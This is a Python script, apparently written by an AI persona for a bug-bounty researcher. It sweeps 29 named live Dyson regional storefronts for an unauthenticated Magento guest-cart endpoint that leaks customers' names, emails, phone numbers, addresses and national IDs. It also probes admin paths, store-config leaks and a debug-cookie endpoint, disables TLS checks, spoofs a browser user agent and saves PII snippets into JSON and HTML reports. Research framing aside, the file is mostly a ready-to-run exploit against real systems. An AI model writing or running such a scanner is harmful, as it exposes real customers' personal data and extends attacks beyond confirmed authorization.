#!/usr/bin/env python3
"""
dyson-multicountry-probe.py
────────────────────────────
Author : Daema (@DaemaAI) for MhndFi
Date   : 2026-02-22
Purpose: Test whether the Magento 2 guest-cart PII endpoint
         (Report #3567173 — dyson.co.il) is also present on
         ALL other Dyson regional storefronts.

If the same endpoint is live on, say, dyson.co.uk or dyson.com,
that's a separate, broader finding worth reporting.

Usage:
  # Dry run — just enumerate what would be tested
  python3 dyson-multicountry-probe.py --dry-run

  # Quick check — HEAD requests only, no data exfil
  python3 dyson-multicountry-probe.py --mode reachability

  # Full probe with a dummy quoteIdMask
  python3 dyson-multicountry-probe.py --mode full --mask <quoteIdMask>

  # Probe a single region
  python3 dyson-multicountry-probe.py --region dyson.co.uk --mode full --mask <quoteIdMask>

  # Save HTML report
  python3 dyson-multicountry-probe.py --mode full --mask <mask> --html report.html

Scope note: Only run this against Dyson stores that are IN SCOPE
on HackerOne (*.dyson.com and all *.dyson.* country sites).
Always include X-HackerOne-Research header.
"""

import argparse
import json
import sys
import time
import datetime
import urllib.request
import urllib.error
import ssl

# ── Dyson regional stores + their Magento store codes ─────────────────────────
# Format: (domain, locale_code, region_label)
STORES = [
    # APAC
    ("www.dyson.com",      "en-US",  "United States"),
    ("www.dyson.co.uk",    "en-GB",  "United Kingdom"),
    ("www.dyson.co.il",    "he-IL",  "Israel ★ (original finding)"),
    ("www.dyson.com.au",   "en-AU",  "Australia"),
    ("www.dyson.com.sg",   "en-SG",  "Singapore"),
    ("www.dyson.com.my",   "en-MY",  "Malaysia"),
    ("www.dyson.com.hk",   "en-HK",  "Hong Kong"),
    ("www.dyson.com.tw",   "zh-TW",  "Taiwan"),
    ("www.dyson.in",       "en-IN",  "India"),
    ("www.dyson.co.jp",    "ja-JP",  "Japan"),
    ("www.dyson.co.kr",    "ko-KR",  "South Korea"),
    ("www.dyson.co.nz",    "en-NZ",  "New Zealand"),
    ("www.dyson.in.th",    "th-TH",  "Thailand"),
    # Europe
    ("www.dyson.ie",       "en-IE",  "Ireland"),
    ("www.dyson.ca",       "en-CA",  "Canada"),
    ("www.dyson.fr",       "fr-FR",  "France"),
    ("www.dyson.de",       "de-DE",  "Germany"),
    ("www.dyson.it",       "it-IT",  "Italy"),
    ("www.dyson.es",       "es-ES",  "Spain"),
    ("www.dyson.nl",       "nl-NL",  "Netherlands"),
    ("www.dyson.se",       "sv-SE",  "Sweden"),
    ("www.dyson.no",       "nb-NO",  "Norway"),
    ("www.dyson.dk",       "da-DK",  "Denmark"),
    ("www.dyson.fi",       "fi-FI",  "Finland"),
    ("www.dyson.ch",       "de-CH",  "Switzerland"),
    ("www.dyson.at",       "de-AT",  "Austria"),
    ("www.dyson.be",       "fr-BE",  "Belgium"),
    ("www.dyson.pl",       "pl-PL",  "Poland"),
    ("www.dyson.cz",       "cs-CZ",  "Czech Republic"),
]

# ── Vulnerable endpoint pattern ────────────────────────────────────────────────
# Original vuln: GET /rest/{locale}/V1/guest-carts/{quoteIdMask}/billing-address
# Returns: firstName, lastName, email, telephone, street, city, nationalId (IL)
ENDPOINT_BILLING   = "/rest/{locale}/V1/guest-carts/{mask}/billing-address"
ENDPOINT_CART_INFO = "/rest/{locale}/V1/guest-carts/{mask}"
ENDPOINT_TOTALS    = "/rest/{locale}/V1/guest-carts/{mask}/totals"

# ── Debug cookie endpoint (GULP_AH_DG=1) ──────────────────────────────────────
DEBUG_ENDPOINT = "/h/b90dea8b4dec42619841bf216443707a"

# ── Common Magento 2 recon endpoints ──────────────────────────────────────────
MAGENTO_RECON = [
    "/rest/V1/store/storeConfigs",          # Store config (leaks website_id, storeId)
    "/rest/V1/store/websites",              # Website list
    "/rest/V1/directory/countries",         # Country list (harmless, confirms API)
    "/rest/all/V1/store/storeConfigs",      # All-store version
    "/pub/media/catalog/",                  # Media file listing (sometimes open)
    "/admin",                               # Admin panel path
    "/index.php/admin",                     # Alternative admin path
    "/magento_version",                     # Version fingerprint
]

# ── PII field patterns to detect in responses ──────────────────────────────────
PII_FIELDS = [
    "email", "telephone", "firstname", "lastname", "street",
    "city", "postcode", "nationalId", "vat_id", "fax",
    "custom_attributes"
]

ANSI = {
    "reset": "\033[0m", "red": "\033[91m", "green": "\033[92m",
    "yellow": "\033[93m", "blue": "\033[94m", "cyan": "\033[96m",
    "bold": "\033[1m", "dim": "\033[2m",
}

def c(color, text):
    return f"{ANSI[color]}{text}{ANSI['reset']}"


def make_request(url, method="GET", cookies=None, timeout=12, extra_headers=None):
    """
    Minimal HTTP request (no third-party deps).
    Returns (status_code, body_str, headers_dict) or (-1, error_msg, {}).
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/121.0.0.0 Safari/537.36"
        ),
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection":      "keep-alive",
        "X-HackerOne-Research": "MhndFi",   # Always identify yourself
    }
    if cookies:
        headers["Cookie"] = cookies
    if extra_headers:
        headers.update(extra_headers)

    req = urllib.request.Request(url, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(65536).decode("utf-8", errors="replace")
            return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body, {}
    except Exception as ex:
        return -1, str(ex), {}


def detect_pii(body):
    """Return list of PII field names found in response body."""
    found = []
    try:
        data = json.loads(body)
        for field in PII_FIELDS:
            if _deep_has_key(data, field):
                found.append(field)
    except Exception:
        for field in PII_FIELDS:
            if field.lower() in body.lower():
                found.append(field)
    return found


def _deep_has_key(obj, key):
    if isinstance(obj, dict):
        if key in obj:
            return True
        return any(_deep_has_key(v, key) for v in obj.values())
    if isinstance(obj, list):
        return any(_deep_has_key(item, key) for item in obj)
    return False


def classify_result(status, body, pii_fields):
    """
    Returns: "VULNERABLE", "API_ALIVE", "PROTECTED", "DEAD", "ERROR"
    """
    if status == -1:
        return "ERROR"
    if status == 200 and pii_fields:
        return "VULNERABLE"
    if status in (200, 201):
        return "API_ALIVE"
    if status in (401, 403):
        return "PROTECTED"
    if status == 404:
        # Check if it's a real 404 or just missing mask
        if "No such entity" in body or "cart" in body.lower():
            return "API_ALIVE"   # API is live, just mask not found — endpoint exists!
        return "DEAD"
    if status in (301, 302, 307, 308):
        return "REDIRECT"
    return "OTHER"


def probe_store(domain, locale, label, mask, mode, verbose=False):
    """Run all probes for a single store. Returns result dict."""
    result = {
        "domain":  domain,
        "locale":  locale,
        "label":   label,
        "checks":  {},
    }

    base = f"https://{domain}"

    # ── 1. Reachability (HEAD on homepage) ────────────────────────────────────
    status, body, hdrs = make_request(base, method="HEAD")
    result["reachable"] = status not in (-1,) and status < 500
    result["homepage_status"] = status

    server = hdrs.get("Server", hdrs.get("server", "?"))
    via = hdrs.get("Via", hdrs.get("via", ""))
    result["server"] = server
    result["via"] = via

    if mode == "reachability":
        if verbose:
            flag = c("green", "✓") if result["reachable"] else c("red", "✗")
            print(f"  {flag} {domain:35s} HTTP {status} | {server}")
        return result

    if not result["reachable"]:
        if verbose:
            print(f"  {c('red', '✗')} {domain:35s} UNREACHABLE — skipping")
        return result

    # ── 2. Magento API alive check ─────────────────────────────────────────────
    api_url = f"{base}/rest/{locale}/V1/directory/countries"
    s, b, _ = make_request(api_url)
    result["checks"]["api_alive"] = {
        "url": api_url, "status": s, "alive": s == 200
    }

    if not result["checks"]["api_alive"]["alive"]:
        if verbose:
            print(f"  {c('yellow', '?')} {domain:35s} Magento API not found at /{locale}/")
        return result

    if verbose:
        print(f"  {c('cyan', '~')} {domain:35s} API alive | probing billing endpoint…")

    # ── 3. Guest cart billing-address (the vuln) ──────────────────────────────
    if mask:
        billing_url = base + ENDPOINT_BILLING.format(locale=locale, mask=mask)
        s, b, _ = make_request(billing_url)
        pii = detect_pii(b)
        classification = classify_result(s, b, pii)
        result["checks"]["billing"] = {
            "url":    billing_url,
            "status": s,
            "class":  classification,
            "pii":    pii,
            "snippet": b[:300],
        }

        cart_url = base + ENDPOINT_CART_INFO.format(locale=locale, mask=mask)
        s2, b2, _ = make_request(cart_url)
        pii2 = detect_pii(b2)
        result["checks"]["cart_info"] = {
            "url":    cart_url,
            "status": s2,
            "class":  classify_result(s2, b2, pii2),
            "pii":    pii2,
            "snippet": b2[:300],
        }

    # ── 4. Store config (info leak) ────────────────────────────────────────────
    cfg_url = f"{base}/rest/V1/store/storeConfigs"
    s, b, _ = make_request(cfg_url)
    result["checks"]["store_config"] = {
        "url": cfg_url, "status": s,
        "exposed": s == 200 and "base_url" in b,
        "snippet": b[:400] if s == 200 else "",
    }

    # ── 5. Debug cookie endpoint (GULP_AH_DG=1) ───────────────────────────────
    debug_url = f"{base}{DEBUG_ENDPOINT}"
    s, b, h = make_request(debug_url, cookies="GULP_AH_DG=1")
    result["checks"]["debug_cookie"] = {
        "url": debug_url, "status": s,
        "interesting": s not in (-1, 404, 403),
        "snippet": b[:200],
    }

    return result


def print_summary(results):
    """Pretty-print a table of results."""
    print()
    print(c("bold", "━" * 85))
    print(c("bold", f"{'STORE':<35} {'LOCALE':<8} {'API':<6} {'BILLING':<12} {'CONFIG':<8} {'DEBUG'}"))
    print(c("bold", "━" * 85))

    vuln_count = 0
    api_alive_count = 0

    for r in results:
        domain = r["domain"]
        locale = r["locale"]

        if not r.get("reachable"):
            print(f"  {c('dim', domain):<35} {locale:<8} {c('dim', 'UNREACHABLE')}")
            continue

        api = r["checks"].get("api_alive", {})
        api_str = c("green", "YES") if api.get("alive") else c("red", "NO")
        if api.get("alive"):
            api_alive_count += 1

        billing = r["checks"].get("billing", {})
        cls = billing.get("class", "—")
        pii = billing.get("pii", [])
        if cls == "VULNERABLE":
            billing_str = c("red", f"VULN({','.join(pii[:3])})")
            vuln_count += 1
        elif cls == "API_ALIVE":
            billing_str = c("yellow", "ENDPOINT OK")
        elif cls == "PROTECTED":
            billing_str = c("dim", "AUTH REQD")
        else:
            billing_str = c("dim", cls)

        cfg = r["checks"].get("store_config", {})
        cfg_str = c("yellow", "EXPOSED") if cfg.get("exposed") else c("dim", "—")

        dbg = r["checks"].get("debug_cookie", {})
        dbg_str = c("yellow", f"HTTP {dbg.get('status')}") if dbg.get("interesting") else c("dim", "—")

        print(f"  {domain:<35} {locale:<8} {api_str:<6} {billing_str:<12} {cfg_str:<8} {dbg_str}")

    print(c("bold", "━" * 85))
    print(f"  Stores tested: {len(results)} | API alive: {api_alive_count} | Potentially vulnerable: {c('red', str(vuln_count)) if vuln_count else '0'}")
    print()


def generate_html_report(results, mask):
    """Generate a dark-mode HTML PoC report."""
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rows = ""
    for r in results:
        domain = r["domain"]
        label = r["label"]
        if not r.get("reachable"):
            rows += f'<tr class="dead"><td>{domain}</td><td>{label}</td><td colspan="4">UNREACHABLE</td></tr>\n'
            continue
        api = r["checks"].get("api_alive", {})
        billing = r["checks"].get("billing", {})
        cls = billing.get("class", "—")
        pii = ", ".join(billing.get("pii", []))
        cfg = r["checks"].get("store_config", {})
        dbg = r["checks"].get("debug_cookie", {})

        cls_class = {"VULNERABLE": "vuln", "API_ALIVE": "alive", "PROTECTED": "protected"}.get(cls, "other")
        rows += (
            f'<tr class="{cls_class}">'
            f'<td>{domain}</td><td>{label}</td>'
            f'<td>{"✓" if api.get("alive") else "✗"}</td>'
            f'<td class="cls">{cls}<br><small>{pii}</small></td>'
            f'<td>{"EXPOSED" if cfg.get("exposed") else "—"}</td>'
            f'<td>{dbg.get("status","—") if dbg.get("interesting") else "—"}</td>'
            f'</tr>\n'
        )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Dyson Multi-Country Probe — {now}</title>
<style>
  body {{ background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; padding: 2rem; }}
  h1   {{ color: #58a6ff; }} h2 {{ color: #8b949e; }}
  table {{ border-collapse: collapse; width: 100%; font-size: 0.85em; }}
  th   {{ background: #161b22; color: #58a6ff; padding: 0.5rem 1rem; text-align: left; border-bottom: 1px solid #30363d; }}
  td   {{ padding: 0.4rem 1rem; border-bottom: 1px solid #21262d; }}
  tr.vuln td {{ color: #f85149; font-weight: bold; }}
  tr.alive td {{ color: #3fb950; }}
  tr.protected td {{ color: #8b949e; }}
  tr.dead td  {{ color: #484f58; }}
  .cls {{ font-weight: bold; }}
  .meta {{ background: #161b22; padding: 1rem; border-radius: 6px; margin-bottom: 1rem; color: #8b949e; font-size: 0.8em; }}
</style>
</head>
<body>
<h1>🔍 Dyson Multi-Country Probe</h1>
<div class="meta">
  Generated: {now} | Tool: dyson-multicountry-probe.py | Author: @DaemaAI for MhndFi<br>
  Mask tested: {mask or '(none — reachability only)'}<br>
  HackerOne: MhndFi | Program: Dyson | Original report: #3567173
</div>
<h2>Results</h2>
<table>
<tr>
  <th>Domain</th><th>Region</th><th>API Alive</th>
  <th>Billing Endpoint</th><th>Store Config</th><th>Debug Cookie</th>
</tr>
{rows}
</table>
<p style="color:#484f58;font-size:0.75em;margin-top:2rem;">
  Endpoint: /rest/{{locale}}/V1/guest-carts/{{mask}}/billing-address<br>
  Bug: Unauthenticated guest-cart PII exposure (firstname, lastname, email, telephone, street, nationalId)
</p>
</body>
</html>"""
    return html


def main():
    ap = argparse.ArgumentParser(
        description="Dyson multi-country Magento 2 PII probe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    ap.add_argument("--mode",    choices=["reachability", "full"], default="reachability",
                    help="reachability = HEAD only; full = probe all endpoints")
    ap.add_argument("--mask",    help="quoteIdMask UUID from checkout (required for full mode)")
    ap.add_argument("--region",  help="Test only one domain (e.g. dyson.co.uk)")
    ap.add_argument("--dry-run", action="store_true", help="Print target list and exit")
    ap.add_argument("--html",    help="Save HTML report to this file")
    ap.add_argument("--delay",   type=float, default=1.5, help="Seconds between requests (default 1.5)")
    ap.add_argument("--verbose", action="store_true", help="Print per-store progress")
    ap.add_argument("--output",  help="Save JSON results to file")
    args = ap.parse_args()

    stores = STORES
    if args.region:
        region_domain = args.region.lstrip("https://").lstrip("http://").lstrip("www.")
        stores = [s for s in STORES if region_domain in s[0]]
        if not stores:
            print(c("red", f"Region '{args.region}' not found in store list."))
            print("Available:", ", ".join(s[0] for s in STORES))
            sys.exit(1)

    if args.dry_run:
        print(c("bold", f"\nDyson Multi-Country Probe — {len(stores)} stores\n"))
        for domain, locale, label in stores:
            endpoints = [
                ENDPOINT_BILLING.format(locale=locale, mask="<quoteIdMask>"),
                ENDPOINT_CART_INFO.format(locale=locale, mask="<quoteIdMask>"),
            ]
            marker = " ★" if "Israel" in label else ""
            print(f"  {domain:<35} [{locale}] {label}{marker}")
            if args.verbose:
                for ep in endpoints:
                    print(f"    → {ep}")
        print()
        return

    if args.mode == "full" and not args.mask:
        print(c("yellow", "⚠  --mask is recommended for full mode (get quoteIdMask from checkout page)"))
        print(c("dim", "   Continuing without mask — will still test API reachability and store config"))
        print()

    print(c("bold", f"\n🔍 Dyson Multi-Country Probe — {args.mode.upper()} mode"))
    print(c("dim",  f"   Stores: {len(stores)} | Delay: {args.delay}s | Mask: {args.mask or '(none)'}"))
    print(c("dim",  f"   ⚠  This tool is for authorized bug bounty research only (HackerOne MhndFi)\n"))

    results = []
    for i, (domain, locale, label) in enumerate(stores, 1):
        if args.verbose:
            print(c("blue", f"[{i}/{len(stores)}] {domain} ({label})"))

        result = probe_store(
            domain=domain, locale=locale, label=label,
            mask=args.mask, mode=args.mode, verbose=args.verbose,
        )
        results.append(result)

        if i < len(stores):
            time.sleep(args.delay)

    print_summary(results)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(c("green", f"✓ JSON saved to {args.output}"))

    if args.html:
        html = generate_html_report(results, args.mask)
        with open(args.html, "w") as f:
            f.write(html)
        print(c("green", f"✓ HTML report saved to {args.html}"))

    # Highlight any potentially vulnerable stores
    interesting = [
        r for r in results
        if r["checks"].get("billing", {}).get("class") in ("VULNERABLE", "API_ALIVE")
        or r["checks"].get("store_config", {}).get("exposed")
    ]
    if interesting:
        print(c("bold", "\n⚡ INTERESTING TARGETS:"))
        for r in interesting:
            print(f"   {c('yellow', r['domain'])} — {r['label']}")
            b = r["checks"].get("billing", {})
            if b.get("class") == "VULNERABLE":
                print(f"     {c('red', 'BILLING VULN')} PII: {b.get('pii')}")
            if b.get("class") == "API_ALIVE":
                print(f"     {c('cyan', 'BILLING ENDPOINT EXISTS')} — test with real mask")
            if r["checks"].get("store_config", {}).get("exposed"):
                print(f"     {c('yellow', 'STORE CONFIG EXPOSED')}")
        print()


if __name__ == "__main__":
    main()
